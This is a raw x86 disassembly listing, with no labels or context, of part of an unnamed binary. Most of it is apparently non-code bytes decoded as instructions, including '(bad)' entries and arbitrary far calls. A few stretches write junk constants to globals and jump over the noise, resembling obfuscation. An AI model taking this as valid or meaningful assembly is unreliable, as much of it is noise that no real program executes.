  417b65:	and    esp,edi
  417b67:	mov    eax,0xede5fc04
  417b6c:	dec    ebx
  417b6d:	xlat   BYTE PTR ds:[ebx]
  417b6e:	cwde   
  417b6f:	lods   eax,DWORD PTR ds:[esi]
  417b70:	pop    ds
  417b71:	in     al,dx
  417b72:	sbb    bl,BYTE PTR [edx+eiz*8]
  417b75:	retf   
  417b76:	neg    BYTE PTR [ecx]
  417b78:	inc    edi
  417b79:	sub    al,0xfa
  417b7b:	retf   
  417b7c:	xor    eax,0x6acc616b
  417b81:	push   0x4de7b6c9
  417b86:	mov    esp,0x79cc713b
  417b8b:	int3   
  417b8c:	call   0xb9d2:0x22da7ba6
  417b93:	xor    DWORD PTR [ecx],0x37
  417b96:	mov    ch,ch
  417b98:	rcr    DWORD PTR [ecx+0x5aa3e222],1
  417b9e:	sar    DWORD PTR [edx+0x449eaf1b],1
  417ba4:	addr16 push eax
  417ba6:	dec    ecx
  417ba7:	xchg   esp,eax
  417ba8:	sub    DWORD PTR [ebp-0x4c6ed909],ebx
  417bae:	mov    dh,0xc5
  417bb0:	push   ss
  417bb1:	jb     0x417b56
  417bb3:	retf   
  417bb4:	aad    0xb8
  417bb6:	in     al,dx
  417bb7:	pop    esp
  417bb8:	fwait
  417bb9:	lock sbb eax,0xba08310d
  417bbf:	js     0x417ba5
  417bc1:	push   cs
  417bc2:	push   ecx
  417bc3:	vhsubps ymm4,ymm1,YMMWORD PTR [edx]
  417bc7:	xchg   ecx,eax
  417bc8:	stos   DWORD PTR es:[edi],eax
  417bc9:	adc    DWORD PTR [ebx+0x58062b3d],0xffffffe8
  417bd0:	ss icebp 
  417bd2:	fs mov ebx,0xa72f87db
  417bd8:	add    DWORD PTR [ecx+0x1cbbbabf],0x90fcc48c
  417be2:	dec    edi
  417be3:	clc    
  417be4:	out    dx,al
  417be5:	ja     0x417b9a
  417be7:	cmp    eax,edi
  417be9:	push   0xffffffdc
  417beb:	inc    esi
  417bec:	cmp    bl,BYTE PTR [ebx]
  417bee:	(bad)  
  417bef:	(bad)  
  417bf0:	in     eax,dx
  417bf1:	push   esp
  417bf2:	mov    es,WORD PTR [ebx+0x7a33a044]
  417bf8:	into   
  417bf9:	adc    edi,DWORD PTR [eax+0x39]
  417bfc:	push   ebp
  417bfd:	sahf   
  417bfe:	xchg   ecx,eax
  417bff:	mov    es,WORD PTR [ebx+0x23]
  417c02:	mov    ds:0xde637c10,eax
  417c07:	jo     0x417be5
  417c09:	xlat   BYTE PTR ds:[ebx]
  417c0a:	sbb    BYTE PTR [ecx],ah
  417c0c:	push   0xb5e527bd
  417c11:	and    ecx,ecx
  417c13:	mov    ebx,DWORD PTR [ebx]
  417c15:	dec    ebp
  417c16:	or     DWORD PTR [edi+0x6],esi
  417c19:	nop
  417c1a:	stos   BYTE PTR es:[edi],al
  417c1b:	retf   
  417c1c:	rcr    eax,0x1a
  417c1f:	xor    al,0x13
  417c21:	enter  0x6da8,0x33
  417c25:	jns    0x417c54
  417c27:	mov    edx,edi
  417c29:	xchg   edi,eax
  417c2a:	jne    0x417bdb
  417c2c:	jns    0x417bf5
  417c2e:	push   ss
  417c2f:	fnstenv [edi-0x4937c1ba]
  417c35:	xchg   ebx,eax
  417c36:	invd   
  417c38:	ret    
  417c39:	sti    
  417c3a:	shr    al,0x1
  417c3d:	shl    ch,1
  417c3f:	jae    0x417c7f
  417c41:	jg     0x417c63
  417c43:	and    BYTE PTR [esi+0x5f],ch
  417c46:	idiv   BYTE PTR [ebp+0x1afbee7b]
  417c4c:	fs into 
  417c4e:	xor    edx,edx
  417c50:	mov    bh,0x21
  417c52:	dec    ebx
  417c53:	inc    ebp
  417c54:	in     eax,dx
  417c55:	mov    dh,0xb
  417c57:	add    cl,bl
  417c59:	aaa    
  417c5a:	add    ah,BYTE PTR [eax+eiz*8+0x937c67a]
  417c61:	ret    0xa230
  417c64:	jb     0x417cc6
  417c66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c67:	daa    
  417c68:	xchg   BYTE PTR [ebp-0x5f],ch
  417c6b:	pop    ecx
  417c6c:	scas   eax,DWORD PTR es:[edi]
  417c6d:	mov    dl,0x5f
  417c6f:	(bad)  
  417c70:	bound  edi,QWORD PTR ds:0xcb720a58
  417c76:	push   esp
  417c77:	ins    DWORD PTR es:[edi],dx
  417c78:	push   eax
  417c79:	or     DWORD PTR [edx-0x4e],ecx
  417c7c:	aam    0x72
  417c7e:	or     al,0xf8
  417c80:	into   
  417c81:	xchg   esp,eax
  417c82:	retf   0x181a
  417c85:	mov    al,0x56
  417c87:	ss mov ah,0x14
  417c8a:	call   0x6829:0xe56df365
  417c91:	mov    cl,0x17
  417c93:	cdq    
  417c94:	adc    ebx,DWORD PTR [ecx-0x32]
  417c97:	and    al,0xda
  417c99:	add    al,0x53
  417c9b:	add    edi,eax
  417c9d:	pop    ebx
  417c9e:	shl    DWORD PTR [ebx],cl
  417ca0:	mov    cl,0xb4
  417ca2:	and    eax,0xea68a98b
  417ca7:	xchg   edx,eax
  417ca8:	sub    al,0x58
  417caa:	repz std 
  417cac:	fist   WORD PTR [edx-0x7f2a9713]
  417cb2:	mov    dl,0xf
  417cb4:	call   0x86f3:0x938915cc
  417cbb:	jmp    0x8d02401e
  417cc0:	jl     0x417d03
  417cc2:	inc    esp
  417cc3:	mov    dh,0xf3
  417cc5:	push   ebx
  417cc6:	pop    edx
  417cc7:	hlt    
  417cc8:	inc    edx
  417cc9:	jl     0x417cc2
  417ccb:	out    0x9b,al
  417ccd:	fiadd  DWORD PTR [eax+ecx*1+0x26]
  417cd1:	enter  0xa438,0x6b
  417cd5:	in     eax,0x98
  417cd7:	lahf   
  417cd8:	jno    0x417d30
  417cda:	add    al,0x61
  417cdc:	cmp    DWORD PTR [ebx],edx
  417cde:	adc    bl,BYTE PTR [ebp-0x4eb5778c]
  417ce4:	and    al,0x58
  417ce6:	jo     0x417c78
  417ce8:	dec    edx
  417ce9:	mov    edi,0x2b20f46c
  417cee:	xor    esi,DWORD PTR [ebp+0x46217ca4]
  417cf4:	jmp    0x8f86:0x1d58b0d
  417cfb:	mov    ah,BYTE PTR [ecx]
  417cfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417cfe:	(bad)
  417d01:	retf   
  417d02:	sbb    BYTE PTR [edi+ebp*2+0x549d59ee],0xec
  417d0a:	call   0xdb1940da
  417d0f:	adc    BYTE PTR ds:0x354e6cca,cl
  417d15:	sbb    ecx,DWORD PTR [eax-0x2edbda59]
  417d1b:	adc    BYTE PTR [edi-0x72],0xcd
  417d1f:	stc    
  417d20:	fwait
  417d21:	push   eax
  417d22:	cmp    ebp,DWORD PTR [ecx+0x623302b6]
  417d28:	lds    ebp,FWORD PTR [edx-0x3e0e48b5]
  417d2e:	xor    eax,DWORD PTR ds:0x3407411
  417d34:	test   al,0x78
  417d37:	iret   
  417d38:	je     0x417d02
  417d3a:	inc    esi
  417d3b:	(bad)  
  417d3c:	dec    esi
  417d3d:	and    DWORD PTR [ebp+0x44],esp
  417d40:	sti    
  417d41:	jge    0x417d21
  417d43:	fiadd  DWORD PTR [edi-0x79]
  417d46:	jo     0x417d37
  417d48:	dec    edi
  417d49:	sbb    eax,0xb8bf56e4
  417d4e:	jge    0x417d1d
  417d50:	cmp    DWORD PTR [ebp+0x16eaca06],0xffffff8e
  417d57:	cmp    ah,BYTE PTR [ecx]
  417d59:	inc    edi
  417d5a:	and    al,BYTE PTR [eax+edi*2-0x2c452071]
  417d61:	ret    
  417d62:	nop
  417d63:	loopne 0x417d98
  417d65:	and    al,0xae
  417d67:	push   esp
  417d68:	push   edi
  417d69:	jne    0x417d32
  417d6b:	pop    edx
  417d6c:	(bad)  
  417d6d:	mov    al,0xe1
  417d6f:	ror    BYTE PTR [ebp+0x2949c59d],cl
  417d75:	fst    DWORD PTR [eax+0x67d04d75]
  417d7b:	lahf   
  417d7c:	lods   al,BYTE PTR ds:[esi]
  417d7d:	sti    
  417d7e:	dec    ebp
  417d7f:	xor    ebx,DWORD PTR [eax]
  417d81:	dec    edi
  417d82:	out    dx,eax
  417d83:	xor    al,0xb1
  417d85:	inc    eax
  417d86:	sub    al,ah
  417d88:	loope  0x417dde
  417d8a:	push   ss
  417d8b:	cld    
  417d8c:	add    DWORD PTR [ecx],esp
  417d8e:	std    
  417d8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d90:	add    edx,esi
  417d92:	ret    
  417d93:	(bad)  
  417d94:	push   ecx
  417d95:	cmp    DWORD PTR [ecx],ebx
  417d97:	test   al,0xf
  417d99:	pop    ecx
  417d9a:	inc    eax
  417d9b:	fidiv  WORD PTR [ebx+edi*1]
  417d9e:	and    dh,BYTE PTR ds:0x2078c993
  417da4:	push   esp
  417da5:	xchg   DWORD PTR [ecx+ebx*8+0x1f],edx
  417da9:	jle    0x417df9
  417dab:	sbb    eax,0xf92c767d
  417db0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417db1:	xchg   ecx,eax
  417db2:	sbb    esp,DWORD PTR [eax+0x577ff503]
  417db8:	jge    0x417df7
  417dba:	aas    
  417dbb:	sbb    dl,BYTE PTR [eax]
  417dbd:	repz add ebx,DWORD PTR [edx]
  417dc0:	(bad)  
  417dc2:	sbb    DWORD PTR [edi+0x385ad7c],edx
  417dc8:	ja     0x417e49
  417dca:	call   0x526b:0x31a44f14
  417dd1:	mov    ds:0x79a83a4,al
  417dd6:	pop    ebx
  417dd7:	xchg   ebx,eax
  417dd8:	cmp    DWORD PTR [ebx-0x45da061],0x7c
  417ddf:	lahf   
  417de0:	pop    ebx
  417de1:	sbb    edi,eax
  417de3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417de4:	cli    
  417de5:	mov    ch,0x52
  417de7:	inc    esi
  417de8:	js     0x417df0
  417dea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417deb:	xor    DWORD PTR [edx-0x56],edi
  417dee:	mov    DWORD PTR [edx-0x3],esp
  417df1:	add    al,0x83
  417df3:	add    dh,al
  417df5:	pop    ss
  417df6:	mov    ebx,0x6b05fd8
  417dfb:	dec    ebp
  417dfc:	mov    BYTE PTR [ecx-0x4e],dh
  417dff:	loope  0x417df1
  417e01:	inc    edi
  417e02:	push   ss
  417e03:	retf   0xc68a
  417e06:	fucomi st,st(1)
  417e08:	sbb    ch,0xa5
  417e0b:	xchg   ecx,eax
  417e0c:	mov    ds,WORD PTR ds:0x8dd17ea5
  417e12:	arpl   WORD PTR [ecx],ax
  417e14:	sbb    BYTE PTR ds:0x7e2cf3b3,cl
  417e1a:	mov    ecx,0xd7b4713c
  417e1f:	iret   
  417e20:	xchg   ebx,eax
  417e21:	je     0x417e51
  417e23:	lods   al,BYTE PTR ds:[esi]
  417e24:	sbb    eax,0xaa893dc4
  417e29:	xor    ebx,DWORD PTR [esi]
  417e2b:	cli    
  417e2c:	dec    ebp
  417e2d:	outs   dx,BYTE PTR ds:[esi]
  417e2e:	rcr    BYTE PTR [ebx],cl
  417e30:	sbb    al,0xb5
  417e32:	pop    es
  417e33:	sbb    eax,0x5d7b1bb4
  417e38:	and    dh,BYTE PTR [eax-0x78]
  417e3b:	push   edi
  417e3c:	imul   ecx,DWORD PTR [ebx-0x35],0xc35e84aa
  417e43:	adc    al,0xdf
  417e45:	mov    ds:0x9c4a274,al
  417e4a:	sub    BYTE PTR ds:[ebx+0x57],ch
  417e4e:	fsub   st,st(4)
  417e50:	push   edx
  417e51:	lods   eax,DWORD PTR ds:[esi]
  417e52:	and    BYTE PTR [ebp-0x4e],bh
  417e55:	adc    al,al
  417e57:	pop    ds
  417e58:	cmp    esp,DWORD PTR [ecx-0x9]
  417e5b:	jmp    0xa1899df4
  417e60:	(bad)  
  417e61:	jmp    0x417de5
  417e63:	mov    ds:0x7bcfc51,eax
  417e68:	div    DWORD PTR cs:[edx-0x2781cd8d]
  417e6f:	mov    ecx,0xbc77a79
  417e74:	jbe    0x417df7
  417e76:	push   es
  417e77:	es das 
  417e79:	retf   
  417e7a:	pop    ecx
  417e7b:	pop    esi
  417e7c:	pop    es
  417e7d:	add    al,0x5d
  417e7f:	outs   dx,DWORD PTR ds:[esi]
  417e80:	(bad)  
  417e81:	mov    esp,0x25c36a64
  417e86:	xchg   ebp,eax
  417e87:	into   
  417e88:	mov    eax,ds:0xb8ba5a7f
  417e8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e8e:	mov    al,BYTE PTR [esp+ebx*4+0x1b]
  417e92:	jp     0x417efe
  417e94:	mov    edi,0xbba204a0
  417e99:	addr16 out 0x3a,eax
  417e9c:	aas    
  417e9d:	and    BYTE PTR [ecx+0x66],cl
  417ea0:	in     al,dx
  417ea1:	test   DWORD PTR ss:[ebx-0x15440be7],ecx
  417ea8:	stc    
  417ea9:	jb     0x417e88
  417eab:	bound  esi,QWORD PTR [edx]
  417ead:	push   0xffffffdc
  417eaf:	clc    
  417eb0:	or     al,0x91
  417eb2:	mov    DWORD PTR [esp+0x3c],0x63d5
  417eba:	mov    DWORD PTR ds:0x42832f,0x432b
  417ec4:	mov    DWORD PTR [esp+0x30],0x169
  417ecc:	mov    DWORD PTR [esp+0x28],0x101b
  417ed4:	mov    DWORD PTR [esp+0x10],0x6bec
  417edc:	mov    eax,DWORD PTR [esp+0x10]
  417ee0:	mov    ecx,DWORD PTR [esp+0x28]
  417ee4:	sub    DWORD PTR ds:0x4281f3,0x42824b
  417eee:	imul   eax,ecx
  417ef1:	or     eax,0x7f7d
  417ef6:	xor    eax,0xcf336131
  417efb:	cmp    DWORD PTR ds:0x428343,0x0
  417f02:	mov    ecx,0x3c6
  417f07:	mov    ecx,0x355d
  417f0c:	mov    ecx,0x21c7
  417f11:	jmp    0x41834c
  417f16:	mov    DWORD PTR ds:0x42823f,0x1cb6
  417f20:	mov    DWORD PTR ds:0x42833b,0x6ca2
  417f2a:	cmp    DWORD PTR ds:0x428343,0x0
  417f31:	jge    0x417f5f
  417f37:	push   DWORD PTR [ebp-0x1c]
  417f3a:	push   DWORD PTR [ebp-0x10]
  417f3d:	call   DWORD PTR ds:0x428e48
  417f43:	sub    DWORD PTR ds:0x428217,0x19df
  417f4d:	xor    ecx,DWORD PTR ds:0x4281fb
  417f53:	mov    ecx,DWORD PTR ds:0x42825b
  417f59:	and    DWORD PTR ds:0x428157,ecx
  417f5f:	xor    ecx,DWORD PTR ds:0x428333
  417f65:	mov    ecx,DWORD PTR ds:0x428147
  417f6b:	or     DWORD PTR ds:0x4282db,ecx
  417f71:	mov    ecx,DWORD PTR ds:0x42835f
  417f77:	or     DWORD PTR ds:0x428247,ecx
  417f7d:	jmp    0x41834c
  417f82:	jp     0x417fbc
  417f84:	lock adc al,0x9b
  417f87:	dec    esp
  417f88:	pop    edx
  417f89:	push   ds
  417f8a:	dec    esp
  417f8b:	retf   
  417f8c:	repnz push 0xffffffd4
  417f8f:	aas    
  417f90:	aas    
  417f91:	mov    esi,0x1816d953
  417f96:	mov    esp,0xd1181812
  417f9b:	leave  
  417f9c:	mov    dl,0xf6
  417f9e:	stc    
  417f9f:	ror    BYTE PTR [ebp+0x70],cl
  417fa2:	gs in  eax,0x8d
  417fa5:	out    0xce,al
  417fa7:	push   es
  417fa8:	aam    0x3a
  417faa:	sar    BYTE PTR [edx],0xe7
  417fad:	into   
  417fae:	mov    ebp,0xf6ba611
  417fb3:	dec    esi
  417fb4:	adc    ebx,esp
  417fb6:	pop    ebx
  417fb7:	fiadd  DWORD PTR [edi-0x30]
  417fba:	dec    ecx
  417fbb:	enter  0xc6a3,0x3c
  417fbf:	xchg   esp,eax
  417fc0:	sbb    eax,0xd63b1c4e
  417fc5:	add    DWORD PTR ss:[eiz*1-0x4e28d2a5],esp
  417fcd:	push   edi
  417fce:	(bad)  
  417fcf:	fcomp  st(2)
  417fd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417fd3:	mov    ebx,0xf525ad77
  417fd8:	imul   ecx,DWORD PTR [ebp+eax*8+0x3c6422ce],0xffffffd8
  417fe0:	das    
  417fe1:	inc    ebp
  417fe2:	ret    
  417fe3:	sub    cl,BYTE PTR [edi+0x19375a45]
  417fe9:	fisttp WORD PTR [esi+edi*1+0x2dc8e6e0]
  417ff0:	sbb    BYTE PTR [edx],al
  417ff2:	mov    esp,0x5ac93e11
  417ff7:	les    ecx,FWORD PTR [eax+0x1b91f1e5]
  417ffd:	js     0x418076
  417fff:	sub    al,BYTE PTR [ebx-0x3e]
  418002:	inc    ebp
  418003:	and    DWORD PTR [eax],ecx
  418005:	sbb    al,0xe6
  418007:	cmp    DWORD PTR [ebp+0xb],ebx
  41800a:	jmp    0xb627e122
  41800f:	xor    DWORD PTR [ebp-0x6278d235],edi
  418015:	enter  0xb224,0x23
  418019:	ss jmp 0x417faa
  41801c:	out    dx,eax
  41801d:	aas    
  41801e:	mov    bh,0xa4
  418020:	scas   al,BYTE PTR es:[edi]
  418021:	fidivr DWORD PTR [edi-0xa]
  418024:	mov    al,0xe7
  418026:	add    al,0xd1
  418028:	aas    
  418029:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41802a:	add    eax,0x445f8a22
  41802f:	mov    eax,ds:0x358fc603
  418034:	jbe    0x417ff3
  418036:	inc    ebp
  418037:	ret    0xab40
  41803a:	sbb    dh,cl
  41803c:	jmp    0x41800f
  41803e:	clc    
  41803f:	das    
  418040:	repz mov ds:0x153895a2,eax
  418046:	and    DWORD PTR [edi-0x5c],edx
  418049:	retf   0x9498
  41804c:	lea    ecx,ds:0xc7c86162
  418052:	cmp    al,0xbc
  418054:	shr    DWORD PTR [ebp-0x22],0x16
  418058:	mov    al,ds:0x2af17d36
  41805d:	test   BYTE PTR [esi+0x12],ch
  418060:	std    
  418061:	ret    0x1402
  418064:	js     0x4180cf
  418066:	scas   al,BYTE PTR es:[edi]
  418067:	xor    ecx,DWORD PTR ds:0xbd946c09
  41806d:	mov    ebx,0x89f56577
  418072:	jno    0x4180d0
  418074:	jmp    0xb91d:0x590e2b78
  41807b:	in     al,0x1c
  41807d:	daa    
  41807e:	push   0x48c04c8c
  418083:	inc    eax
  418084:	ret    
  418085:	test   BYTE PTR cs:[edi],al
  418088:	inc    eax
  418089:	add    eax,0xcf6fb9
  41808e:	lods   al,BYTE PTR ds:[esi]
  41808f:	cli    
  418090:	test   ebp,eax
  418092:	iret   
  418093:	dec    esi
  418094:	fstp   TBYTE PTR [ecx+esi*4]
  418097:	out    dx,eax
  418098:	inc    ebp
  418099:	cmp    esi,DWORD PTR [ecx]
  41809b:	sbb    al,0xdd
  41809d:	icebp  
  41809e:	sti    
  41809f:	test   eax,0x9350f197
  4180a4:	push   0xf55022f5
  4180a9:	out    dx,al
  4180aa:	sub    BYTE PTR [ecx-0x73],0x4b
  4180ae:	dec    ecx
  4180af:	dec    ebx
  4180b0:	mov    al,ds:0x81503694
  4180b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180b6:	arpl   di,si
  4180b8:	data16 jp 0x4180b0
  4180bb:	rol    eax,1
  4180bd:	jle    0x418116
  4180bf:	push   ecx
  4180c0:	outs   dx,DWORD PTR ds:[esi]
  4180c1:	out    dx,al
  4180c2:	ins    BYTE PTR es:[edi],dx
  4180c3:	lods   eax,DWORD PTR ds:[esi]
  4180c4:	in     al,dx
  4180c5:	out    0x4,al
  4180c7:	mov    ah,0x38
  4180c9:	aam    0x5c
  4180cb:	adc    al,0xdb
  4180cd:	test   esp,edi
  4180cf:	xchg   ecx,eax
  4180d0:	retf   0x448a
  4180d3:	sbb    BYTE PTR [ebx-0x433e06f8],dl
  4180d9:	mov    ch,0xe4
  4180db:	call   0xe305:0xf6297606
  4180e2:	cwde   
  4180e3:	or     DWORD PTR [esi],0x266dc9f1
  4180e9:	inc    esp
  4180ea:	xor    esi,DWORD PTR ds:0x530a4506
  4180f0:	test   eax,0x970c564a
  4180f5:	push   ebx
  4180f6:	mov    bl,0xbb
  4180f8:	in     eax,dx
  4180f9:	mov    cl,0xef
  4180fb:	mov    ah,0x37
  4180fd:	xchg   ebx,eax
  4180fe:	rol    BYTE PTR [edi+0x2b],1
  418101:	xchg   edx,eax
  418102:	retf   0x2617
  418105:	imul   esp,esi,0x8
  418108:	push   eax
  418109:	push   eax
  41810a:	fisub  WORD PTR [edi+0x2b]
  41810d:	jae    0x418174
  41810f:	pop    eax
  418110:	mov    ecx,0x4ee855e4
  418115:	lock and eax,0xe2cb70dd
  41811b:	into   
  41811c:	inc    esp
  41811d:	mov    ebx,DWORD PTR [edx-0x6698289]
  418123:	sbb    eax,0x953d8b41
  418128:	add    BYTE PTR [ecx-0x7b],al
  41812b:	and    al,0x3c
  41812d:	push   ss
  41812e:	test   al,0xe8
  418130:	push   0x4145cde
  418135:	enter  0x799d,0x49
  418139:	shl    DWORD PTR [esi-0x42e01019],1
  41813f:	mov    ecx,0x243192ed
  418144:	cmc    
  418145:	cmp    DWORD PTR [ecx+0x6ebc8d4],edx
  41814b:	inc    esi
  41814c:	push   0x3b
  41814e:	and    bh,BYTE PTR [ebx]
  418150:	xor    eax,0xc97d7112
  418155:	dec    ebp
  418156:	cmp    al,0xfd
  418158:	mov    cl,0x44
  41815a:	out    dx,al
  41815b:	push   cs
  41815c:	addr16 aam 0x10
  41815f:	mov    esp,0x83c1f989
  418164:	mov    cl,0xeb
  418166:	(bad)  
  418168:	and    eax,0xbaa8e4a7
  41816d:	jmp    0x6223d05a
  418172:	out    0xda,al
  418174:	or     cl,BYTE PTR [edi-0x3935705c]
  41817a:	sub    eax,0x44043d2f
  41817f:	nop
  418180:	dec    ebx
  418181:	scas   al,BYTE PTR es:[edi]
  418182:	mov    ecx,0xdcdf8eb4
  418187:	(bad)  
  418188:	mov    edx,0xf9324973
  41818d:	sub    eax,0x8e0c7211
  418192:	(bad)  
  418193:	clc    
  418194:	test   al,0xf
  418196:	imul   edi,eax,0xecdd727a
  41819c:	mov    bl,0x4d
  41819e:	add    BYTE PTR [eax-0x66ef0f13],dl
  4181a4:	scas   al,BYTE PTR es:[edi]
  4181a5:	or     al,0x40
  4181a7:	adc    al,0xaa
  4181a9:	and    cl,cl
  4181ab:	aaa    
  4181ac:	leave  
  4181ad:	pop    edi
  4181ae:	sub    edx,DWORD PTR [ecx]
  4181b0:	pop    ebp
  4181b1:	ficom  WORD PTR [ebx-0x94887e6]
  4181b7:	pop    edi
  4181b8:	loopne 0x41815e
  4181ba:	add    bh,BYTE PTR [ebx]
  4181bc:	ror    DWORD PTR [ebx],cl
  4181be:	(bad)  
  4181c0:	cmp    al,0x2e
  4181c2:	das    
  4181c3:	int    0xa4
  4181c5:	push   0xffffffda
  4181c7:	jmp    0x4181c0
  4181c9:	mov    al,0x5c
  4181cb:	mov    ds:0x821ba767,al
  4181d0:	lea    ecx,[ebx]
  4181d2:	cmp    cl,BYTE PTR [edx]
  4181d4:	jp     0x4181dd
  4181d6:	jnp    0x4181d8
  4181d8:	and    eax,ecx
  4181da:	mov    edi,DWORD PTR [esi+0x5]
  4181dd:	jo     0x41818d
  4181df:	fdivr  QWORD PTR [edx]
  4181e1:	push   ecx
  4181e2:	and    bl,ah
  4181e4:	inc    esi
  4181e5:	inc    ebp
  4181e6:	sar    al,0x4e
  4181e9:	jmp    0x4966:0x3e6fc08c
  4181f0:	fs and al,0x28
  4181f3:	mov    ah,0xd
  4181f5:	hlt    
  4181f6:	adc    BYTE PTR [ebp-0x65b6d473],bh
  4181fc:	xor    eax,0x562a20a5
  418201:	sbb    eax,0xf85d856d
  418206:	adc    al,0xd6
  418209:	int3   
  41820a:	stc    
  41820b:	imul   esp,DWORD PTR [edx+0x7e122409],0xca07af54
  418215:	adc    DWORD PTR [ecx+edi*2+0x8],esp
  418219:	nop
  41821a:	sar    DWORD PTR [ebp+0x5ce3850],0xf3
  418221:	and    DWORD PTR [eax-0x3e],0x43d48313
  418228:	push   ecx
  418229:	ror    DWORD PTR [esp+ebx*4],1
  41822c:	mov    dh,0x12
  41822e:	cld    
  41822f:	push   cs
  418230:	(bad)  
  418231:	call   0xfa00:0x789823c
  418238:	push   ecx
  418239:	and    BYTE PTR [ebp-0x4a5825c5],bh
  41823f:	arpl   WORD PTR ds:0xe4265a59,sp
  418245:	mov    dl,0x7b
  418247:	aas    
  418248:	jp     0x41822c
  41824a:	xor    esi,DWORD PTR [eax-0xc]
  41824d:	inc    ecx
  41824e:	inc    edx
  41824f:	pusha  
  418250:	adc    DWORD PTR [esi],esp
  418252:	cmp    al,0x6a
  418254:	dec    edi
  418255:	sub    BYTE PTR [eax+eiz*8],bl
  418258:	pop    esp
  418259:	test   eax,0x5e0c8f25
  41825e:	mov    ebx,0xccf51adc
  418263:	jg     0x418260
  418265:	(bad)  
  418266:	int    0x1
  418268:	lea    esp,[ecx+edi*4-0xd]
  41826c:	retf   
  41826d:	dec    edi
  41826e:	stos   DWORD PTR es:[edi],eax
  41826f:	out    0xd5,eax
  418271:	mov    ebp,0x58d4aa9c
  418276:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418277:	dec    edx
  418278:	stos   DWORD PTR es:[edi],eax
  418279:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41827a:	push   edx
  41827b:	psllw  mm2,QWORD PTR [ebx+0x760501fe]
  418282:	mov    ah,0xaf
  418284:	out    0x57,eax
  418286:	jg     0x4182a7
  418288:	js     0x4182cd
  41828a:	data16 add al,BYTE PTR [eax]
  41828d:	arpl   WORD PTR ss:[ebp-0xc],ax
  418291:	adc    ecx,DWORD PTR [ebp-0x4]
  418294:	jb     0x418291
  418296:	sub    edx,DWORD PTR [esi+0x42]
  418299:	cwde   
  41829a:	adc    BYTE PTR [ebp+eax*4+0x65],bh
  41829e:	mov    esp,0x9ab7a2d2
  4182a3:	cmp    ebx,DWORD PTR [eax-0x78]
  4182a6:	jb     0x4182da
  4182a8:	mov    ebp,0x2817152c
  4182ad:	fsubrp st(5),st
  4182af:	or     DWORD PTR [eax+0x4f],eax
  4182b2:	mov    ebp,0x4ae9e9bf
  4182b7:	pop    ebx
  4182b8:	js     0x41826e
  4182ba:	icebp  
  4182bb:	or     DWORD PTR [eax+0x65278908],edx
  4182c1:	adc    esi,DWORD PTR [ebx]
  4182c3:	dec    edx
  4182c4:	jge    0x41832a
  4182c6:	and    esi,0x59
  4182c9:	add    cl,BYTE PTR [eax+ebx*2-0x7e]
  4182cd:	xlat   BYTE PTR ds:[ebx]
  4182ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182cf:	adc    ebx,edi
  4182d1:	call   DWORD PTR [ecx]
  4182d3:	sub    BYTE PTR [ebp-0x24e7b1fc],0x2d
  4182da:	jae    0x418300
  4182dc:	sub    eax,0xb7973b95
  4182e1:	call   0x37f94e86
  4182e6:	nop
  4182e7:	mov    ds:0x8dd6667,eax
  4182ec:	lock mov ebx,0x5c2ed6c9
  4182f2:	sti    
  4182f3:	icebp  
  4182f4:	inc    eax
  4182f5:	aaa    
  4182f6:	sbb    DWORD PTR [ebx],esp
  4182f8:	cmp    edx,DWORD PTR [esi-0x33]
  4182fb:	inc    edx
  4182fc:	mov    al,0xb7
  4182fe:	adc    al,0x6e
  418300:	scas   al,BYTE PTR es:[edi]
  418301:	dec    ebx
  418302:	nop
  418303:	in     eax,dx
  418304:	jg     0x4182a7
  418306:	mov    eax,ds:0xb97c024a
  41830b:	xchg   ebp,eax
  41830c:	dec    ecx
  41830d:	fidiv  WORD PTR [edx+0x9]
  418310:	lock push ebx
  418312:	add    al,0x8b
  418314:	adc    DWORD PTR [eax+0x71],edx
  418317:	or     al,0x94
  418319:	mov    ?,WORD PTR [esi+0xa1e5f42]
  41831f:	(bad)  
  418320:	(bad)  
  418322:	push   ds
  418323:	icebp  
  418324:	and    ch,cl
  418326:	push   esi
  418327:	(bad)  
  418328:	sub    BYTE PTR [edi+ebp*2-0x28b9bbd1],bh
  41832f:	pop    ss
  418330:	pusha  
  418331:	loop   0x4182ba
  418333:	sub    DWORD PTR [ebx],esi
  418335:	mov    BYTE PTR [ebx+0x72aff50b],dh
  41833b:	jno    0x418313
  41833d:	mov    ecx,fs
  41833f:	jno    0x418338
  418341:	sti    
  418342:	imul   esp,DWORD PTR [edx-0x4996c48d],0xfffffff5
  418349:	neg    DWORD PTR [ebp-0x36]
  41834c:	push   DWORD PTR [eax]
  41834e:	mov    eax,DWORD PTR [esp+0x34]
  418352:	cmp    DWORD PTR ds:0x428147,0x0
  418359:	mov    DWORD PTR ds:0x42820b,0x42c6
  418363:	mov    DWORD PTR ds:0x428347,edx
  418369:	mov    DWORD PTR ds:0x428123,0x1d0
  418373:	jmp    0x4183cc
  418378:	mov    DWORD PTR ds:0x428247,0x243f
  418382:	mov    DWORD PTR ds:0x42821f,0x6875
  41838c:	cmp    DWORD PTR ds:0x428147,0x0
  418393:	ja     0x4183ba
  418399:	push   0x36f9
  41839e:	push   0x4282e3
  4183a3:	push   0x488c
  4183a8:	call   DWORD PTR ds:0x428e4c
  4183ae:	add    DWORD PTR ds:0x4282af,ecx
  4183b4:	add    ecx,DWORD PTR ds:0x428233
  4183ba:	xor    DWORD PTR ds:0x4282e7,edx
  4183c0:	mov    ecx,DWORD PTR ds:0x4282c3
  4183c6:	or     DWORD PTR ds:0x42813f,ecx
  4183cc:	add    eax,0x75d9
  4183d1:	xor    DWORD PTR ds:0x4281eb,ebx
  4183d7:	push   0xd
  4183d9:	not    ecx
  4183db:	pop    ecx
  4183dc:	xor    edx,edx
  4183de:	div    ecx
  4183e0:	mov    ecx,DWORD PTR [esp+0x40]
